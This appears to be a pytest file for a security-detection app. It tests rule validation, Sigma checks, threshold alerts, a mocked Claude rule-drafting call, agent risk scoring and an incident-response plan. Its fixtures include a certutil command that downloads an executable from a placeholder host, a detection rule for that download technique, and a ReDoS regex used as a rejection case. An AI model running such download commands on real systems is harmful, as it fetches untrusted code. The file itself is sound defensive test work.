import json
from types import SimpleNamespace

from app import ai, ingest, phase4, telemetry

NOW = 1_800_000_000.0
RULE = {"kind": "process", "match": "all", "title": "certutil download", "severity": "high", "technique": "T1105",
        "tactic": "Command and Control",
        "conditions": [{"field": "image", "op": "contains", "value": "certutil"},
                       {"field": "cmdline", "op": "regex", "value": r"-urlcache.*http"}],
        "threshold": {"count": 0, "window_sec": 0, "group_by": ""}}
GOOD = {"kind": "process", "host": "H", "image": "certutil.exe", "cmdline": "certutil -urlcache -f http://x/a.exe a.exe"}
BENIGN = {"kind": "process", "host": "H", "image": "certutil.exe", "cmdline": "certutil -hashfile a.iso SHA256"}


def test_validate_rejects_bad_fields_ops_and_redos():
    assert phase4.validate_rule(RULE) == []
    bad = {**RULE, "conditions": [{"field": "nope", "op": "contains", "value": "x"},
                                  {"field": "cmdline", "op": "eval", "value": "x"},
                                  {"field": "cmdline", "op": "regex", "value": "(a+)+$"}]}
    errs = " ".join(phase4.validate_rule(bad))
    assert "nope" in errs and "eval" in errs and "ReDoS" in errs
    assert phase4.validate_rule({**RULE, "kind": "shell"})
    assert phase4.validate_rule({**RULE, "threshold": {"count": 3, "window_sec": 0, "group_by": "host"}})


def test_tests_backtest_and_sigma():
    cases = [{"description": "download", "record_json": json.dumps(GOOD), "should_match": True},
             {"description": "hash", "record_json": json.dumps(BENIGN), "should_match": False},
             {"description": "broken", "record_json": "{", "should_match": True}]
    res = phase4.run_tests(RULE, cases)
    assert [r["passed"] for r in res] == [True, True, False]
    bt = phase4.backtest(RULE, [{**GOOD, "ts": NOW}, {**BENIGN, "ts": NOW + 60}, {**GOOD, "ts": NOW + 120, "simulated": False}])
    assert bt["hits"] == 2 and bt["real_hits"] == 1 and bt["span_minutes"] == 2.0
    assert phase4.check_sigma("title: x\nlogsource: {category: process_creation}\ndetection: {sel: {a: b}, condition: sel}") == []
    assert phase4.check_sigma("title: x\ndetection: {sel: {a: b}}") == ["Sigma ขาด 'logsource'", "Sigma detection ขาด 'condition'"]
    assert phase4.check_sigma("title: [")[0].startswith("Sigma YAML")


def test_threshold_rules_and_engine_alerts():
    eng = telemetry.Engine(seed=1, simulate=False)
    th = {**RULE, "id": "CUS-001", "status": "enabled", "conditions": [{"field": "image", "op": "equals", "value": "certutil.exe"}],
          "threshold": {"count": 3, "window_sec": 60, "group_by": "host"}}
    eng.custom.load([th, {**RULE, "id": "CUS-002", "status": "disabled"}])
    recs, _ = ingest.parse(json.dumps([{**BENIGN, "ts": NOW + i} for i in range(3)]).encode(), "native", now=NOW)
    r = eng.ingest_external(recs)
    assert r["alerts_by_rule"] == {"CUS-001": 1} and eng.custom.hits["CUS-001"] == 1
    ev = [e for e in eng.events if e.get("rule") == "CUS-001"][0]
    assert ev["simulated"] is False and ev["detector"] == "custom" and ev["severity"] == "high"
    assert len(eng.raw) == 3


async def test_draft_rule_with_claude(monkeypatch):
    draft = {"title": "certutil ดาวน์โหลดไฟล์", "description": "d", "severity": "high", "technique": "T1105",
             "tactic": "Command and Control", "local_rule": {k: RULE[k] for k in ("kind", "match", "conditions", "threshold")},
             "sigma": "title: x\nlogsource: {category: process_creation}\ndetection: {sel: {Image|endswith: certutil.exe}, condition: sel}",
             "kql": "DeviceProcessEvents | where FileName =~ 'certutil.exe'", "spl": "", "false_positives": ["admin"],
             "test_cases": [{"description": "dl", "record_json": json.dumps(GOOD), "should_match": True}]}
    calls = []

    class M:
        async def create(self, **kw):
            calls.append(kw)
            return SimpleNamespace(content=[SimpleNamespace(type="text", text=json.dumps(draft, ensure_ascii=False))],
                                   stop_reason="end_turn", model=kw["model"], usage=SimpleNamespace(input_tokens=1, output_tokens=1))
    monkeypatch.setattr(ai, "client", lambda: SimpleNamespace(beta=SimpleNamespace(messages=M())))
    monkeypatch.setenv("ANTHROPIC_API_KEY", "k")
    out = await phase4.draft_rule("ตรวจ certutil ที่ดาวน์โหลดไฟล์จาก 10.1.2.3")
    assert "10.1.2.3" not in json.dumps(calls[0]["messages"]) and calls[0]["output_config"]["effort"] == "high"
    rule = phase4.assemble(out)
    res = phase4.evaluate_draft(rule, out["test_cases"], [])
    assert res["errors"] == [] and res["sigma_errors"] == [] and res["tests"][0]["passed"]
    monkeypatch.delenv("ANTHROPIC_API_KEY")
    assert "error" in await phase4.draft_rule("anything long enough")


def test_agent_risk_explains_points():
    shadow = phase4.agent_risk({"id": "x", "scopes": None, "egress": None, "shell": None}, [], [])
    assert shadow["score"] == 25 and shadow["level"] == "medium" and shadow["factors"][0]["category"] == "governance"
    tidy = phase4.agent_risk({"id": "kb", "owner": "cx", "scopes": ["kb.search"], "egress": ["api.internal"], "shell": False}, [], [])
    assert tidy["score"] == 0 and tidy["level"] == "low"
    busy = phase4.agent_risk({"id": "ops", "owner": "p", "scopes": ["shell.exec", "git.push"], "egress": ["a"], "shell": True},
                             [{"severity": "critical", "rule": "AGT-009"}, {"severity": "high", "rule": "AGT-003"}],
                             [{"kind": "tool_call", "decision": "denied"}, {"kind": "prompt", "rules": ["AGT-007"]}])
    assert busy["score"] >= 75 and busy["level"] == "critical"
    assert sum(f["points"] for f in busy["factors"]) >= busy["score"]


def test_response_plan_phases_and_pdpa_clock():
    inc = {"id": 9, "first_ts": NOW, "alerts": [{"rule": "OAI-010"}, {"rule": "OAI-011"}, {"technique": "T1003.001"}]}
    plan = phase4.response_plan(inc)
    phases = {s["phase"] for s in plan["steps"]}
    assert phases == {"contain", "eradicate", "recover", "notify", "lessons"}
    assert plan["personal_data_risk"] and plan["pdpa_deadline"] == NOW + 72 * 3600
    assert any("สคส." in s["action"] for s in plan["steps"])
    sid = plan["steps"][0]["id"]
    done = phase4.response_plan(inc, {sid: {"done": True, "by": "a", "at": NOW}})
    assert done["steps"][0]["done"] and done["progress"] > 0
    assert not phase4.response_plan({"id": 1, "alerts": [{"rule": "OAI-008"}]})["personal_data_risk"]
